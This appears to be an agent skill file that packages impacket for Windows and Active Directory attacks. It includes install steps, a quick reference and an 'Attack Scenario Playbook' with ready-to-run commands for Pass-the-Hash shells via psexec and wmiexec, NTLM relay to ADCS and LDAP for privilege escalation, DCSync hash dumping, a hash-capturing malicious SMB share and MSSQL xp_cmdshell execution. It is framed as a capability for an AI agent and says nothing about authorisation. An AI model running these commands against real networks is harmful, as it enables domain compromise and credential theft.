---
name: impacket-protocol-exec
description: "impacket scripts perform PTH lateral shells and NTLM relay to ADCS privilege escalation. Signals: lateral movement, psexec."
zh-signals: "impacket 协议执行脚本集: PTH 横向拿 shell、NTLM 中继到 ADCS 提权。信号:横向移动,psexec。"
when-to-use: >-
  Use during Windows or AD lateral movement when you need protocol-based remote
  execution (psexec, wmiexec, smbexec, atexec, or mssql), Pass-the-Hash, NTLM
  relay, or DCSync.
---

# impacket protocol execution script suite

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/fortra/impacket
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `psexec.py` | SMB + Service Control Manager remote SYSTEM shell |
| `wmiexec.py` | WMI semi-interactive shell (no files left behind, few logs) |
| `smbexec.py` | SMB share + bat execution shell |
| `dcomexec.py` | DCOM (MMC20/ShellWindows) remote execution |
| `atexec.py` | Scheduled task remote execution, returns output |
| `mssqlclient.py` | Interactive MSSQL client (xp_cmdshell privilege escalation execution) |
| `-hashes LM:NT` | Pass-the-Hash authentication |
| `-k / -no-pass` | Kerberos ticket authentication |
| `ntlmrelayx.py` | NTLM relay (--delegate-sid / --escalate-user) |
| `secretsdump.py` | Remote DCSync / registry hash export |
| `smbserver.py` | Malicious SMB share (lures victims into leaking hashes) |

## Attack Scenario Playbook

### Pass-the-Hash lateral shell

```bash
impacket-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT> administrator@10.0.0.5
impacket-wmiexec.py -hashes <LM:NT> admin@10.0.0.5
```

### NTLM relay to ADCS for privilege escalation

```bash
impacket-ntlmrelayx.py -t http://dc01/certsrv/certfnsh.asp --adcs --smb2support
impacket-ntlmrelayx.py --delegate-access -t ldap://dc01 -smb2support
```

### MSSQL blind injection execution

```bash
impacket-mssqlclient.py -windows-auth sql_svc@10.0.0.8
enable_xp_cmdshell; xp_cmdshell whoami
```

## Notes

The existing skill only covers kerberoast and ESC8; this skill completes the protocol execution script matrix. The script name is the entry point, and parameters support all three authentication modes: Kerberos, hash, and plaintext.
